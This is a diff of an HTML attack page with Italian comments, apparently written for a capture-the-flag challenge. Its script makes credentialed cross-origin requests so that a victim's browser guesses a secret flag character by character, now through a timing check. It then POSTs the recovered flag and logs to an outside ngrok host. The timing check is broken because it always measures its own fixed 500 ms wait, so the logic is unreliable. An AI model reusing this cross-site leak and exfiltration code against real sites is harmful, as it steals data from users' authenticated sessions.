@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rubare Flag</title>
+    <title>Rubare Flag con Timing Attack</title>
 </head>
 <body>
     <h1>Rubare la Flag dell'Architetto</h1>
@@ -12,62 +12,54 @@
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
     let currentFlag = 'flag{'; // Inizio della flag
     let position = 5; // Posizione successiva da testare
+    let logMessages = []; // Log per invio progressivo
 
-    const testChar = (position) => {
-        if (position < 100) { // Limite superiore
+    const testChar = async (position) => {
+        if (position < 100) { 
             for (let char of chars) {
                 const query = `${baseUrl}${currentFlag}${char}`;
+                const startTime = new Date().getTime();
+
+                // Effettua la richiesta senza attendere il risultato
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include',
                     mode: 'no-cors'
-                })
-                .then(response => {
-                    // Non possiamo accedere alla risposta, quindi facciamo affidamento sul comportamento
-                    // Log per il carattere testato
-                    logProgress(`Testing character: ${char} at position: ${position}`);
+                });
 
-                    if (response.ok) {
-                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
-                        currentFlag += char; // Aggiungi carattere
-                        logProgress(`Current partial flag: ${currentFlag}`);
-                        testChar(currentFlag.length); // Prossima posizione
-                        return; // Esci per evitare conflitti
-                    }
-                })
-                .catch(error => console.error('Errore:', error));
+                // Misura il tempo di risposta
+                await new Promise(resolve => setTimeout(resolve, 500)); // Aspetta 500ms
+                const responseTime = new Date().getTime() - startTime;
+
+                // Analisi del timing
+                if (responseTime > 450) {  // Se supera il tempo base, assume che sia valido
+                    console.log(`Carattere trovato: ${char}`);
+                    logMessages.push(`Trovato carattere ${char} a posizione ${position}`);
+                    currentFlag += char;
+                    await testChar(currentFlag.length); // Passa alla posizione successiva
+                    return;
+                } else {
+                    console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                }
             }
         } else {
-            console.log(`Flag completa: ${currentFlag}`);
-            // Invia la flag completa al server Flask
+            // Log della flag finale
+            console.log(`Flag trovata: ${currentFlag}`);
+            logMessages.push(`Flag completa: ${currentFlag}`);
             fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: `flag=${encodeURIComponent(currentFlag)}`
+                body: `flag=${encodeURIComponent(currentFlag)}&log=${encodeURIComponent(logMessages.join('\n'))}`
             })
             .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Errore:', error));
+            .then(data => console.log('Risposta dal server:', data))
+            .catch(error => console.error('Errore durante l\'invio della flag:', error));
         }
     };
 
-    // Funzione per inviare log di avanzamento al server Flask
-    const logProgress = (message) => {
-        fetch('https://bcc2-87-4-142-72.ngrok-free.app/log', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: `log=${encodeURIComponent(message)}`
-        })
-        .then(response => response.text())
-        .then(data => console.log(`Server response: ${data}`))
-        .catch(error => console.error('Errore durante l\'invio del log:', error));
-    };
-
-    // Inizia il test
+    // Avvio
     testChar(position);
     </script>
 </body>
